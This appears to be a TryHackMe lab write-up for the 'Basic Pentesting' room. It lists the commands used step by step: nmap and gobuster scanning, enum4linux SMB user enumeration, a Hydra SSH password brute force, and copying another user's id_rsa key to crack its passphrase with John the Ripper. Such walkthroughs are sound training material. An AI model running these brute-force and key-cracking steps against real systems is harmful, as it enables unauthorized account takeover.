# Basic Pentesting

<img align="right" src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/basicpentestingjt/basicpentestingjt01.png" width="150" height="150">

This is a machine that allows you to practise web app hacking and privilege escalation

LINK = [https://tryhackme.com/room/basicpentestingjt](https://tryhackme.com/room/basicpentestingjt)

### FYI
This writeup don't include any passwords/cracked hashes/flags

# Description
This is a machine that allows you to practise web app hacking and privilege escalation

# Steps

1 - Join the room, start the virtual machine and the AttackBox (or connect via VPN)

2 - Scan the virtual machine to find the open port ```nmap -sV {IP-ADDRESS}```

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/basicpentestingjt/basicpentestingjt02.png" width="50%">

3 - Discover hiden directorties in the webserver ```gobuster dir -u {IP-ADDRESS} -w wordlist.txt```

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/basicpentestingjt/basicpentestingjt03.png" width="50%">

4 - Enumerate users in the SMB service using ```enum4linux -a {IP-ADDRESS}```

5 - Now that you have one user you can use Hydra to get the password
* ```hydra -l {USERNAME} -P /usr/share/wordlists/rockyou.txt ssh://{IP-ADDRESS}```

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/basicpentestingjt/basicpentestingjt04.png" width="50%">

6 - Connect via ssh to the machine with the user and password

7 - The second user has the final password that you are looking for but you can access for lack of permissions

8 - The second user has the private ssh certificate in the ```.ssh/id_rsa``` directory

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/basicpentestingjt/basicpentestingjt05.png" width="50%">

9 - Copy that file and convert the certificate in a format that John the Ripper can understand
* ```/opt/john/ssh2john.py id_rsa > hash.txt```

10 - Use John the Ripper to crack the password of the hash
* ```john hash.txt --wordlist=/use/share/wordlist/rockyou.txt```

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/basicpentestingjt/basicpentestingjt06.png" width="50%">

11 - Use the certiticate and the password to conect to the virtual machine
* ```ssh -i id_rsa {USERNAME}@{IP-ADDRESS}```

<img src="https://github.com/matthernet/Writeups/blob/main/TryHackMe/Room/basicpentestingjt/basicpentestingjt07.png" width="50%">

12 - Get the flag!! ðŸ˜Ž
